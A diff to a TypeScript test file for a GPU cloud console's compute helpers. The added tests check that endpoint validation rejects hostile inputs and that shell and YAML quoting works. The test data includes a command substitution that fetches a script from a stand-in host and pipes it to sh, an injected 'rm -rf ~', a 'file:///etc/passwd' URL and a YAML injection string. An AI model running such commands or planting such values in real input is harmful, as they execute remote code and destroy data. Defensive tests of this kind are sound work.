@@ -11,7 +11,7 @@ import { ThemeProvider } from "@/providers/theme-provider"
 
 import { rupeesToPaise, type Billing, type CloudInfo, type JobDetail, type JobTemplate, type Member, type Offer, type Rental, type Usage, type WorkspaceRole } from "./api"
 import { cloudRoutes } from "./app"
-import { endReason, joinArgs, parseEnv, parseSlugs, priceLabel, serviceHint, splitArgs } from "./compute"
+import { endReason, joinArgs, parseEnv, parseSlugs, priceLabel, serviceEndpoint, serviceHint, shellQuote, splitArgs, yamlQuote } from "./compute"
 import { CloudSessionProvider } from "./session"
 
 const INFO: CloudInfo = {
@@ -258,12 +258,26 @@ describe("compute helpers", () => {
     expect(serviceHint(`docker.io/vllm/vllm-openai@sha256:${"c".repeat(64)}`, "http://h:9001", "mst_x")?.code).toContain("Bearer mst_x")
     expect(serviceHint(IMAGE, "http://h:1", "t")).toBeNull()
     expect(serviceHint(jupyter, "", "t")).toBeNull()
+    // M3: an endpoint is only ever a plain http(s) origin; anything that could run in a shell gives no hint.
+    for (const hostile of ["http://x$(curl -s evil.sh|sh):9000", "http://h:9000; rm -rf ~", "http://h:9000/\n  - name: x", "http://u:p@h:1", "file:///etc/passwd", "http://h:1/?a=b"]) {
+      expect(serviceHint(`docker.io/vllm/vllm-openai@sha256:${"c".repeat(64)}`, hostile, "mst_x")).toBeNull()
+      expect(serviceEndpoint(hostile)).toBeNull()
+    }
+    expect(serviceHint(`docker.io/vllm/vllm-openai@sha256:${"c".repeat(64)}`, "http://10.0.0.5:9001", "mst_x")?.code).toBe(
+      "curl 'http://10.0.0.5:9001/v1/models' -H 'Authorization: Bearer mst_x'",
+    )
+    expect(shellQuote("it's")).toBe(`'it'\\''s'`)
+    expect(yamlQuote("a\n  - name: injected")).toBe('"a\\n  - name: injected"')
   })
 
   it("parses NAME=value lines and names the first bad one", () => {
     expect(parseEnv("A=1\n\nURL=http://x/?a=b\n")).toEqual({ env: { A: "1", URL: "http://x/?a=b" }, bad: null })
     expect(parseEnv("A=1\nnot valid").bad).toBe("not valid")
     expect(parseEnv("MERIDIAN_JOB_RANK=3").bad).toBe("MERIDIAN_JOB_RANK=3")
+    // H4: names the GPU runtime reads are refused before they reach the server.
+    expect(parseEnv("NVIDIA_VISIBLE_DEVICES=all").bad).toBe("NVIDIA_VISIBLE_DEVICES=all")
+    expect(parseEnv("CUDA_VISIBLE_DEVICES=0").bad).toBe("CUDA_VISIBLE_DEVICES=0")
+    expect(parseEnv("NVIDIA_TF32_OVERRIDE=0").bad).toBeNull()
   })
 
   it("explains why a rental ended", () => {
